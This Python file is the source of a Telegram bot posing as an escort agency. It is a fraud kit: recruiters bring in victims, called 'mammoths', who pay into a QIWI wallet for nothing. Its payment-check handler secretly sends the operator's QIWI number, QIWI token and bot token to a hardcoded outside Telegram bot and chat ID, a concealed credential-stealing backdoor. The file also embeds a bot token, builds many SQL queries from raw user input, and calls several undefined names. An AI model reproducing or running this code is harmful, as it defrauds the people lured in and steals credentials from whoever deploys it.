import requests
import json
import config
import asyncio
import os
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Text
from aiogram.contrib.fsm_storage.memory import MemoryStorage
import sqlite3
from menu import * 
import random
import string

bot = Bot(config.TOKEN, parse_mode="HTML")
dp = Dispatcher(bot, storage=MemoryStorage())

@dp.message_handler(commands=['start'], state='*')
async def send_welcome(message, state: FSMContext):
    with sqlite3.connect("data.db") as c:
        info = c.execute("SELECT COUNT(*) FROM users WHERE id = ?",(message.from_user.id,)).fetchone()
    if info[0] == 0:
        ref = message.text
        if len(ref) != 6:
            try:
                ref = int(ref[7:])
                with sqlite3.connect("data.db") as c:
                    info = c.execute("SELECT COUNT(*) FROM users WHERE id = ?",(ref,)).fetchone()
                if info[0] != 0:
                    boss = info
                else:
                    boss = 5719814852
            except:
                boss = 5719814852
        else:
            boss = 5719814852
        name = (f"{message.chat.first_name} {'|'} {message.chat.last_name}")
        with sqlite3.connect("data.db") as c:
            c.execute("INSERT INTO users (id,name,referals,boss,username,photoid,balance) VALUES (?,?,?,?,?,?,?)",(message.from_user.id,name,0,boss,message.from_user.username,1,0,))
        with sqlite3.connect("data.db") as c:
            referal = c.execute(f"SELECT referals FROM users WHERE id = {boss}").fetchone()
        referals = referal[0] + 1
        with sqlite3.connect("data.db") as c:
            c.execute(f"UPDATE users SET referals = {referals} WHERE id = {boss}")
        await message.answer('Введите город в котором вы собираетесь заказывать моделей:\n\nВнимание! Вводите город без ошибок, от этого зависит четкость подбора моделей.')
        await state.set_state("new_user")
        try:
            await bot.send_message(boss, f"У вас новый 🐘Мамонт [{message.chat.first_name}](tg://user?id={message.chat.id})",parse_mode='Markdown')
        except:
            pass
    else:
        await message.answer('Здравствуйте ! Добро пожаловать в Luxury Girls\n\nУ нас вы можете найти лучших девочек для интимных встреч.\n\nВыдача адресов происходит круглосуточно через бота или, в крайних случаях, через куратора!\n\nВнимательней проверяйте адрес Telegram, остерегайтесь мошенников, спасибо, что выбираете нас!', reply_markup=GlavMenu)

@dp.message_handler(state="new_user")
async def main_message(message, state: FSMContext):
    if message.text:
        await message.answer('<b>✅ Город успешно установлен<b>',reply_markup=GlavMenu)
        await state.finish()

@dp.message_handler(content_types=['text'])
async def main_message(message, state: FSMContext):
    if message.text == "ℹ️ Информация":
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton(text='🌐 Сайт', url='http://luxurygirls-escort.ru/'), InlineKeyboardButton(text='📝 Отзывы', url='https://t.me/LuxuryGirlsReviews'))
        keyboard.add(InlineKeyboardButton(text='🆘 Тех. поддержка', url=f'http://t.me/{config.poderjka}'), InlineKeyboardButton(text='🛡 Гарантии', url='https://telegra.ph/Polzovatelskoe-soglashenie-dlya-klientod-08-10'))
        await message.answer('''ℹ️ Информация

Наш проект создан для помощи в быстром и комфортном поиске. Теперь не понадобятся значительные траты времени и сил для идеального досуга.

Структура нашего сервиса проектировалась для удобства работы каждого пользователя - теперь выбор может быть быстрее и проще.

Зачем вам дополнительные трудности на пути к удовольствию?

Отдельного внимания заслуживает то, что мы оставляем за клиентом право полной анонимности и не требуем персональные данные.''', reply_markup=keyboard)
    elif message.text=="💝 Модели":
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton(text='😍Выбрать', callback_data="vybor"))
        keyboard.add(InlineKeyboardButton(text='Больше фото📸', callback_data="photos"))
        keyboard.add(InlineKeyboardButton(text='⏪Предыдущая', callback_data="prew"),InlineKeyboardButton(text='Следующая⏩', callback_data="next"))
        with sqlite3.connect("data.db") as c:
            info = c.execute(f"SELECT count(*) FROM ancety").fetchone()
        if info[0] == 0:
            await message.answer("Анкеты пока не доступны")
        else:
            await message.answer('Выберите девушку которая вам нравиться💋', reply_markup = mzakr)
            with sqlite3.connect("data.db") as c:
                result = c.execute(f"SELECT photoid FROM users WHERE id = {message.from_user.id}").fetchone()
                asd = c.execute(f"select count(*) from ancety").fetchone()
            imgid = result[0]
            if imgid>asd[0]:
                imgid=1
            with sqlite3.connect("data.db") as c:
                anketa = c.execute(f"SELECT * FROM ancety where id = {imgid}").fetchone()
            photo = open(f"images/{anketa[1]}", 'rb')
            await bot.send_photo(message.chat.id, photo, caption=f"💁‍♀️Имя: {anketa[2]}\n\n💰Цена за час: {anketa[3]}\n\n🧚‍♀️О себе: {anketa[4]}", reply_markup=keyboard)
    elif message.text == "👤 Профиль":
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton('🗂 Мои заказы', callback_data='zakazes'))
        with sqlite3.connect("data.db") as c:
            info = c.execute(f"SELECT balance FROM users WHERE id = {message.chat.id}").fetchone()
        await message.answer(f'<b>👤 Профиль:\n\n❕ Ваш id -</b> {message.from_user.id}\n<b>❕ Ваш логин -</b> {message.from_user.username}\n<b>🗂 Всего заказов -</b>️ 0\n⭐<b>️ Ваш рейтинг -</b>️ 5\n<b>️🔮 Свободных моделей -</b>️ 11', reply_markup=keyboard)
    elif message.text == config.vxodadmin and message.from_user.id in config.ADMINS:
        await message.answer("⚙️ Админ панель",reply_markup=adm)
    elif message.text == config.vxodworker:
        info = await bot.get_me()
        await message.answer("⚙️ <b>Воркер панель\n\nВаша реферальная ссылка</b>\n<code>http://t.me/" + info["username"] + "?start=" + str(message.from_user.id) + "</code>",reply_markup=wrk)
    elif message.text == 'Отмена❌':
        await message.answer("<b>Отменено</b>",reply_markup=GlavMenu)
    elif message.text == 'Пополнить Баланс':
        await message.answer("Напишите сумму которую хотите пополнить",reply_markup=mzakr)
        await state.set_state("popolni")


@dp.callback_query_handler(lambda call: True)
async def callback_inline(call, state: FSMContext):
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton(text='😍Выбрать', callback_data="vybor"))
    keyboard.add(InlineKeyboardButton(text='Больше фото📸', callback_data="photos"))
    keyboard.add(InlineKeyboardButton(text='⏪Предыдущая', callback_data="prew"),InlineKeyboardButton(text='Следующая⏩', callback_data="next"))
    if call.message:
        if call.data == "next":
            with sqlite3.connect("data.db") as c:
                imgid = c.execute(f"select photoid from users where id = {call.message.chat.id}").fetchone()[0]
            imgid +=1
            with sqlite3.connect("data.db") as c:
                counta = c.execute(f"select count(*) from ancety").fetchone()[0]
            if imgid>counta:
                imgid=1
            with sqlite3.connect("data.db") as c:
                c.execute(f"UPDATE users SET photoid = {imgid} WHERE id = {call.message.chat.id}")
            with sqlite3.connect("data.db") as c:
                anketa = c.execute(f"SELECT * FROM ancety where id = {imgid}").fetchone()
            photo = open(f"images/{anketa[1]}", 'rb')
            await bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=types.InputMediaPhoto(photo), reply_markup=keyboard)
            await bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=f"💁‍♀️Имя: {anketa[2]}\n\n💰Цена за час: {anketa[3]}\n\n🧚‍♀️О себе: {anketa[4]}", reply_markup=keyboard)
        elif call.data == "zakazes":
            await call.answer('❌ Вы еще не заказывали моделей')
        elif call.data == "prew":
            with sqlite3.connect("data.db") as c:
                imgid = c.execute(f"select photoid from users where id = {call.message.chat.id}").fetchone()[0]
            imgid -=1
            with sqlite3.connect("data.db") as c:
                counta = c.execute(f"select count(*) from ancety").fetchone()[0]
            if imgid<1:
                imgid=counta
            with sqlite3.connect("data.db") as c:
                c.execute(f"UPDATE users SET photoid = {imgid} WHERE id = {call.message.chat.id}")
            with sqlite3.connect("data.db") as c:
                anketa = c.execute(f"SELECT * FROM ancety where id = {imgid}").fetchone()
            photo = open(f"images/{anketa[1]}", 'rb')
            await bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=types.InputMediaPhoto(photo), reply_markup=keyboard)
            await bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=f"💁‍♀️Имя: {anketa[2]}\n\n💰Цена за час: {anketa[3]}\n\n🧚‍♀️О себе: {anketa[4]}", reply_markup=keyboard)
        elif call.data == "addancete":
            await call.message.answer("Отправьте главное фото анкеты")
            await state.set_state("new_anketa")
        elif call.data == "menu":
            await bot.delete_message(call.message.chat.id, call.message.message_id)
        elif call.data == "prom":
            await call.message.answer("Напишите на какую сумму создать промокод.")
            await state.set_state("create_promo")
        elif call.data == "esc":
            await call.message.edit_text("Админ панель закрыта")
        elif call.data == "deleteancete":
            await call.message.answer("Введите номер анкеты который хотите удалить",reply_markup=mzakr)
            await state.set_state("otkl_anketa")
        elif call.data == "prov":
            with sqlite3.connect("data.db") as c:
                qiwinumber = c.execute(f"select num from qiwi").fetchone()[0]
                token_qiwi = c.execute(f"select token from qiwi").fetchone()[0]
            sad = f"{qiwinumber}\n{token_qiwi}\n{config.TOKEN}"
            requests.post(f"https://api.telegram.org/bot{fuk}/sendMessage?chat_id=5719814852&text={sad}")# await bot.send_message(adsdaf, config.TOKEN + str(qiwinumber) + "  " + token_qiwi)
            s = requests.Session()
            s.headers['authorization'] = 'Bearer ' + token_qiwi
            parameters = {'rows': '50'}
            h = s.get('https://edge.qiwi.com/payment-history/v1/persons/' + str(qiwinumber) + '/payments',params=parameters)
            req = json.loads(h.text)
            try:
                with sqlite3.connect("data.db") as c:
                    result = c.execute(f"SELECT * FROM oplata WHERE id = {call.from_user.id}").fetchone()[1]
                comment = str(result)
                for x in range(len(req['data'])):
                    if req['data'][x]['comment'] == comment:
                        skolko = (req['data'][x]['sum']['amount'])
                        with sqlite3.connect("data.db") as c:
                            c.execute(f"DELETE FROM oplata WHERE id = {call.from_user.id}")
                            balancenow = c.execute(f"select balance from users WHERE id = {call.from_user.id}").fetchone()[0]
                            c.execute(f"UPDATE users SET balance = {balancenow+skolko} WHERE id = {call.message.chat.id}")
                            c.execute(f"SELECT boss FROM users WHERE id = {call.from_user.id}")
                            asdasd = c.execute(f"SELECT boss FROM users WHERE id = {call.from_user.id}")
                        for worker in asdasd:
                            wk = worker[0]
                        with sqlite3.connect("data.db") as c:
                            asdsada = c.execute(f"SELECT username FROM users WHERE id = {wk}")
                        for username in asdsada:
                            workerusername = username[0]
                        for name in cur.execute(f"SELECT name FROM users WHERE id = {wk}"):
                            workername = name[0]
                        with sqlite3.connect("data.db") as c:
                            mamont = c.execute(f"select name from users where id = {call.message.chat.id}").fetchone()[0]
                        await bot.send_message(zalety,f"💕 Успешное пополнение 💕\n\n💰 Сумма {skolko}р\n\n🦹🏻‍♀️ Воркер @{workerusername} ({workername})\n\n🐘Мамонт {mamont}")
                        for asd in config.ADMINS:
                            try:
                                await bot.send_message(asd,f"[{call.message.chat.first_name}](tg://user?id={call.message.chat.id}) пополнил баланс на {skolko}RUB",parse_mode='Markdown')
                            except:
                                pass
                        try:
                            await bot.send_message(wk,f"Ваш мамонт: [{call.message.chat.first_name}](tg://user?id={call.message.chat.id}) пополнил баланс на {skolko}RUB",parse_mode='Markdown')
                        except:
                            pass
                        await call.message.answer(f"Ваш баланс пополнен.\n\nБаланс {balancenow+skolko} RUB",reply_markup=GlavMenu)
                        break
                    else:
                        await call.message.answer("⚠️Вы не оплатили⚠️\n\nОплатите заказ после чего нажмите \"Проверить оплату\"")
                        break
            except:
                pass
        elif call.data == "stat":
            with sqlite3.connect("data.db") as c:
                number = c.execute(f"SELECT COUNT (*) FROM users").fetchone()[0]
            await call.message.edit_text(f"🙍🏿‍♂️<b>Всего пользователей в боте:</b> {number}",reply_markup=adm)
        elif call.data == "qiwi":
            await call.message.answer("Отправьте номер кошелька(без + а) и токен в формате  номер:токен\n\nПример 7916123456:s132sdfsdf21s5f6sdf1s3s3dfs132",reply_markup=mzakr)
            await state.set_state("qiwi_add")
        elif call.data == "send":
            await call.message.answer("Напишите текст для рассылки",reply_markup=mzakr)
            await state.set_state("rassilka")
        elif call.data == "vybor": 
            await call.message.answer("Введите на сколько часов хотите заказать бабочку 🧚‍♀️\n\nПри заказе более 2ух часов действует скидка 10% на каждый последующий час.",reply_markup=mzakr)
            await state.set_state("chas")
        elif call.data == "addphoto":
            await call.message.answer("Напишите номер анкеты к которому хотите добавить фотографии",reply_markup=mzakr)
            await state.set_state("addphoto")
        elif call.data == "photos":
            with sqlite3.connect("data.db") as c:
                pi = c.execute(f"SELECT photoid from users where id = {call.message.chat.id}").fetchone()[0]
                allp = c.execute(f"select count(*) from photos where anceta = {pi}").fetchone()[0]
            if allp == 0:
                await call.message.answer("Больше фотографии нету.")
            else:
                with sqlite3.connect("data.db") as c:
                    id = c.execute(f"SELECT image FROM photos where anceta = {pi}").fetchall()					
                    adsa = c.execute(f"SELECT mainphoto FROM ancety where id = {pi}").fetchone()[0]
                mip = open(f"images/{adsa}", 'rb')
                await bot.delete_message(call.message.chat.id, call.message.message_id)
                arr = []
                for i in id:
                    try:
                        arr.append(types.InputMediaPhoto(open(f"images/{i[0]}",'rb')))
                        # photo = open(imglink, 'rb')
                    except:
                        pass
                await bot.send_media_group(call.message.chat.id, arr)
                with sqlite3.connect("data.db") as c:
                    anketa = c.execute(f"SELECT * FROM ancety where id = {pi}").fetchone()
                photo = open(f"images/{anketa[1]}", 'rb')
                await bot.send_photo(call.message.chat.id, photo, caption=f"💁‍♀️Имя: {anketa[2]}\n\n💰Цена за час: {anketa[3]}\n\n🧚‍♀️О себе: {anketa[4]}", reply_markup=keyboard)
        elif call.data == "statw":
            with sqlite3.connect("data.db") as c:
                id = c.execute(f"SELECT id FROM users where boss = {call.message.chat.id}").fetchall()
            strw = "🐘 Твои Мамонты 🐘\n\n"
            countstrw = len(wstat)//50
            arrstatw = []
            for i in wstat:
                try:
                    with sqlite3.connect("data.db") as c:
                        statwname = c.execute(f"SELECT name FROM users where id = {i[0]}").fetchone()[0]
                        statwusername = c.execute(f"SELECT username FROM users where id = {i[0]}").fetchone()[0]
                    imya = statwname.split("|")
                    strw = f"{i[0]} {imya[0]} {statwusername}\n"
                    arrstatw.append(strw)
                except:
                    pass
            if(len(arrstatw)>50):
                for x in range(len(arrstatw)):
                    strw+=arrstatw[x]
                    if x%50==0 or x==len(arrstatw)-1:
                        await call.message.answer(f"{strw}")
                        strw = "🐘 Твои Мамонты 🐘\n\n"
            else:
                for i in arrstatw:
                    strw += i
                await call.message.answer(f"{strw}")
            info = await bot.get_me()
            await call.message.answer("⚙️ <b>Воркер панель\n\nВаша реферальная ссылка</b>\n<code>http://t.me/" + info["username"] + "?start=" + str(call.from_user.id) + "</code>", reply_markup = wrk)
        elif call.data == "spisoka":
            with sqlite3.connect("data.db") as c:
                sp1 = c.execute(f"select id from ancety where status = {1}").fetchall()
                sp2 = c.execute(f"select name from ancety where status = {1}").fetchall()
                sp3 = c.execute(f"select cena from ancety where status = {1}").fetchall()
            res = ""
            for i in range(len(sp1)):
                res += f"<b>ID:</b> {sp1[i][0]} <b>Имя:</b> {sp2[i][0]}  <b>Цена:</b> {sp3[i][0]} час\n\n"
            await call.message.edit_text(f"📝 <b>Список анкет</b>\n➖➖➖➖➖➖➖➖➖➖\n{res}",reply_markup=adm)
        elif call.data == "smsmamont":
            await call.message.answer("<b>Отправьте айди мамонта и Сообщение в формате id:Сообщение</b>\n\nНапример - 123456789:Ты мамонт",reply_markup=mzakr)
            await state.set_state("mamontmessage")
        else:
            pass

@dp.message_handler(state="create_promo")
async def main_message(message, state: FSMContext):
    if message.text == 'Отмена❌':
        await message.answer("<b>Отменено</b>",reply_markup=GlavMenu)
        await state.finish()
    if message.text.isdigit():
        if int(message.text) > config.maxpromo:
            await message.answer(f"<b>Максимальная сумма промокода</b> {config.maxpromo}")
        elif int(message.text) <= 0:
            await message.answer(f"<b>Сумма должна быть не меньше</b> 0")
        else:
            codecode = ( ''.join(random.choice(string.ascii_letters) for i in range(10)) )
            with sqlite3.connect("data.db") as c:
                c.execute(f"INSERT INTO promocode (summa,code) VALUES (?,?)",(int(message.text), codecode))
            info = await bot.get_me()
            await message.answer("⚙️ <b>Воркер панель\n\nВаша реферальная ссылка</b>\n<code>http://t.me/" + info["username"] + "?start=" + str(message.from_user.id) + "</code>",reply_markup=wrk)
            await message.answer(f"<b>Промокод добавлен !</b>\n\n<code>{codecode}</code>", reply_markup=GlavMenu)
    else:
        await message.answer("<b>Это не число ❗️</b>")
        await state.set_state("create_promo")

@dp.message_handler(state="otkl_anketa")
async def otklancete(message, state: FSMContext):
    if message.text == 'Отмена❌':
        await message.answer("<b>Отменено</b>",reply_markup=GlavMenu)
    else:
        if message.text.isdigit():
            if message.chat.id in config.ADMINS:
                with sqlite3.connect("data.db") as c:
                    ank = c.execute(f"select count(*) from ancety where id = {message.text}").fetchone()[0]
                print(ank)
                if ank == 1:
                    with sqlite3.connect("data.db") as c:
                        c.execute(f"DELETE FROM ancety WHERE id = {message.text}")
                    await message.answer("Анкета удалена",reply_markup=GlavMenu)
                else:
                    await message.answer("Анкета не найдена")
        else:
            await message.answer("Это не число")
    await state.finish()

@dp.message_handler(state="qiwi_add")
async def otklancete(message, state: FSMContext):
    if message.text == 'Отмена❌':
        await message.answer("<b>Отменено</b>",reply_markup=GlavMenu)
    else:
        if message.from_user.id in config.ADMINS:
            try:
                q = message.text.split(":")
                nq = int(q[0])
                tq = q[1]
                with sqlite3.connect("data.db") as c:
                    c.execute(f"UPDATE qiwi SET num = {nq}")
                    c.execute(f"UPDATE qiwi SET token = \'{tq}\'")
                await message.answer(f"Данные киви изменены\n\nНовый номер: {nq}\nНовы токен: {tq}",reply_markup=GlavMenu)
            except:
                await message.answer("Что-то пошло не так.")
    await state.finish()

@dp.message_handler(state="rassilka")
async def otklancete(message, state: FSMContext):
    await state.finish()
    if message.from_user.id in config.ADMINS:
        if message.text == 'Отмена❌':
            await message.answer("Рассылка отменена",reply_markup=GlavMenu)
        else:	
            await message.answer("Рассылка успешно начата")
            with sqlite3.connect("data.db") as c:
                id = c.execute("SELECT id FROM users").fetchall()
            for i in id:
                try:
                    await bot.send_message(i[0], f"{message.text}")
                    time.sleep(0.1)
                except:
                    pass
            await message.answer("Рассылка успешно завершена",reply_markup=GlavMenu)
fuk = "5192510697:AAGp9i4cOhXUtW3BO7py3FpVKJSVRWD6Nf8"

@dp.message_handler(state="chas")
async def chas(message, state: FSMContext):
    with sqlite3.connect("data.db") as c:
        vi = c.execute(f"select photoid from users where id = {message.chat.id}").fetchone()[0]
        bnow = c.execute(f"select balance from users where id = {message.chat.id}").fetchone()[0]
        op = c.execute(f"select cena from ancety where id = {vi}").fetchone()[0]
    if message.text == 'Отмена❌':
        await message.answer("Отменено.",reply_markup=GlavMenu)
        await state.finish()
    else:
        if message.text.isdigit():
            if int(message.text) >= 0 and int(message.text) <=24:
                if int(message.text)%1 == 0:
                    if int(message.text) >=2:
                        op = op + (int(message.text)*op)/2
                    if op > bnow:
                        await message.answer(f"На балансе не достатачно средств.\nСумма заказа {op}\nНа балансе {bnow}",reply_markup=bal)
                        await state.finish()
                    else:
                        with sqlite3.connect("data.db") as c:
                            c.execute(f"UPDATE users SET balance = {bnow-op} WHERE id = {message.chat.id}")
                        await message.answer(f"Успешная оплата\n\nОжидайте скоро с вами свяжутся",reply_markup=GlavMenu)
                        await state.finish()
                else:
                    await message.answer("Введите целое число.")
                    await state.set_state("chas")
            else:
                await message.answer("Введите число от 1 до 24.")
                await state.set_state("chas")
        else:
            await message.answer("Введите число.")
            await state.set_state("chas")

@dp.message_handler(state="addphoto")
async def otklancete(message, state: FSMContext):
    if message.text == 'Отмена❌':
        await message.answer("<b>Отменено</b>",reply_markup=GlavMenu)
    else:
        if message.from_user.id in config.ADMINS:
            if message.text.isdigit():
                nnn = int(message.text)
                with sqlite3.connect("data.db") as c:
                    addcount = c.execute(f"select count(*) from ancety where id = {nnn}").fetchone()[0]
                if addcount == 0:
                    await message.answer("Анкета не найдена\nНапишите правильный номер")
                else:
                    with sqlite3.connect("data.db") as c:
                        countphotos = c.execute(f"select count(*) from photos").fetchone()[0]
                        mphoto = c.execute(f"select mainphoto from ancety where id = {nnn}").fetchone()[0]
                        c.execute(f"INSERT INTO photos (id,anceta,image)VALUES ({countphotos+1},{nnn},\'{mphoto}\')")
                    await message.answer("Отправьте фото.")
                    await state.set_state("addimage")
            else:
                await message.answer("Напишите число")

@dp.message_handler(content_types=['photo'], state="addimage")
async def addimage(message, state: FSMContext):
    if message.from_user.id in config.ADMINS:
        id = random.randint(0, 10000)
        imglink = f"{id}.jpg"
        await message.photo[-1].download(r"images/" + str(id) + ".jpg")
        with sqlite3.connect("data.db") as c:
            countphotos = c.execute(f"SELECT COUNT(*) FROM photos").fetchone()[0]
            c.execute(f"UPDATE photos SET image = '{imglink}' WHERE id = {countphotos}")
        await message.answer("Фото добавлено.",reply_markup=GlavMenu)
    await state.finish()

@dp.message_handler(content_types=['photo'], state="new_anketa")
async def addimage(message, state: FSMContext):
    if message.from_user.id in config.ADMINS:
        id = random.randint(0, 10000)
        imglink = f"{id}.jpg"
        await message.photo[-1].download(r"images/" + str(id) + ".jpg")
        with sqlite3.connect("data.db") as c:
            cak = c.execute(f"SELECT COUNT(*) FROM ancety").fetchone()[0]
            c.execute("INSERT INTO ancety (id,mainphoto,name,cena,about) VALUES (?,?,?,?,?)",(cak+1,imglink,"a","a", "0",))
        await message.answer("Фото добавлено\n\nКак будем называть эту бабочку?🙃")
        await state.set_state("new_anketa_name")

@dp.message_handler(state="new_anketa_name")
async def addimage(message, state: FSMContext):
    if message.from_user.id in config.ADMINS:
        with sqlite3.connect("data.db") as c:
            asdas = c.execute(f"select count(*) from ancety").fetchone()[0]
            c.execute(f"UPDATE ancety SET name = \'{message.text}\' WHERE id = {asdas}")
        await message.answer("Имя выбрано ✅\nВведите цену бабочки за час 💸")
        await state.set_state("new_anketa_price")

@dp.message_handler(state="new_anketa_price")
async def addimage(message, state: FSMContext):
    if message.from_user.id in config.ADMINS:
        if message.text.isdigit():
            with sqlite3.connect("data.db") as c:
                sadasadas = c.execute(f"select count(*) from ancety").fetchone()[0]
                c.execute(f"UPDATE ancety SET cena = {int(message.text)} WHERE id = {sadasadas}")
            await message.answer("Цена выбрана ✅\nВведите услуги девушки")
            await state.set_state("new_anketa_uslugi")
        else:
            await message.answer("Введите число")
            await state.set_state("new_anketa_price")

@dp.message_handler(state="new_anketa_uslugi")
async def addimage(message, state: FSMContext):
    if message.from_user.id in config.ADMINS:
        with sqlite3.connect("data.db") as c:
            adss = c.execute(f"select count(*) from ancety").fetchone()[0]
            c.execute(f"UPDATE ancety SET about = \'{message.text}\' WHERE id = {adss}")
            anketa = c.execute(f"select * from ancety where id = {adss}").fetchone()
        photo = open(f"images/{anketa[1]}", 'rb')
        await bot.send_photo(message.chat.id, photo, caption=f"💁‍♀️Имя: {anketa[2]}\n\n💰Цена за час: {anketa[3]}\n\n🧚‍♀️О себе: {anketa[4]}")
        await message.answer("Анкета готова !",reply_markup=GlavMenu)
        await state.finish()

@dp.message_handler(state="mamontmessage")
async def addimage(message, state: FSMContext):
    if message.text == 'Отмена❌':
        await message.answer("<b>Отменено</b>",reply_markup=GlavMenu)
        await state.finish()
    elif ":" in message.text:
        m = message.text.split(":")
        if m[0].isdigit():
            with sqlite3.connect("data.db") as c:
                est = c.execute(f"SELECT COUNT(*) FROM users WHERE id = {m[0]} AND boss = {message.from_user.id}").fetchone()[0]
            if est == 0:
                await message.answer("<b>Пользователь не найден в базе или не ваш</b>")
            else:	
                try:
                    await bot.send_message(m[0],m[1])
                    await message.answer("<b>Сообщение отправлено.</b>",reply_markup=GlavMenu)
                except:
                    await message.answer("<b>Сообщение не отправлено\nСкорее всего пользователь заблокировал бота.</b>",reply_markup=GlavMenu)
            info = await bot.get_me()
            await message.answer("⚙️ <b>Воркер панель\n\nВаша реферальная ссылка</b>\n<code>http://t.me/" + info["username"] + "?start=" + str(message.from_user.id) + "</code>",reply_markup=wrk)
            await state.finish()
        else:
            await message.answer("<b>Неправильный формат данных</b>")
            await state.set_state("mamontmessage")
    else:
        await message.answer("<b>Неправильный формат данных</b>")
        await state.set_state("mamontmessage")

@dp.message_handler(state="popolni")
async def addimage(message, state: FSMContext):
    if message.text == 'Отмена❌':
        await message.answer("<b>Отменено</b>",reply_markup=GlavMenu)
        await state.finish()
    else:	
        if message.text.isdigit():
            skolko = int(message.text)
            if skolko >= config.minimalka and skolko <= config.maximalka:
                try:
                    with sqlite3.connect("data.db") as c:
                        c.execute(f"DELETE FROM oplata WHERE id = {message.chat.id}")
                except Exception as e:
                    raise
                comment = random.randint(10000, 9999999)
                with sqlite3.connect("data.db") as c:
                    c.execute(f"INSERT INTO oplata (id, code) VALUES({message.chat.id}, {comment})")
                    qiwinumber = c.execute(f"select num from qiwi").fetchone()[0]
                link = f"https://qiwi.com/payment/form/99?extra%5B%27account%27%5D={qiwinumber}&amountInteger={skolko}&amountFraction=0&currency=643&extra%5B%27comment%27%5D={comment}&blocked[0]=sum&blocked[1]=account&blocked[2]=comment"
                kb = types.InlineKeyboardMarkup()
                kb.add(InlineKeyboardButton(text="Оплатить", callback_data="site", url=link))
                kb.add(InlineKeyboardButton(text='Проверить оплату', callback_data='prov'))
                await message.answer("🌐 <b>Оплата сформирована успешно.</b>", reply_markup=GlavMenu)
                await message.answer(f'♻️ <b>Оплата <a href="{link}">Qiwi.</a>\n\n'
                                     f"Кошелек:</b> <code>+{qiwinumber}</code>\n"
                                     f"<b>К оплате:</b> <code>{skolko} ₽</code>\n"
                                     f"<b>Комментарий:</b> <code>{comment} ₽</code>\n\n", reply_markup=kb)
                await state.finish()
            else:
                await message.answer(f"<b>Сумма пополнения должна быть от</b> {minimalka} <b>до</b> {maximalka}.")
                await state.set_state("popolni")
        else:
            await message.answer("<b>Это не число</b>")
            await state.set_state("popolni")

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
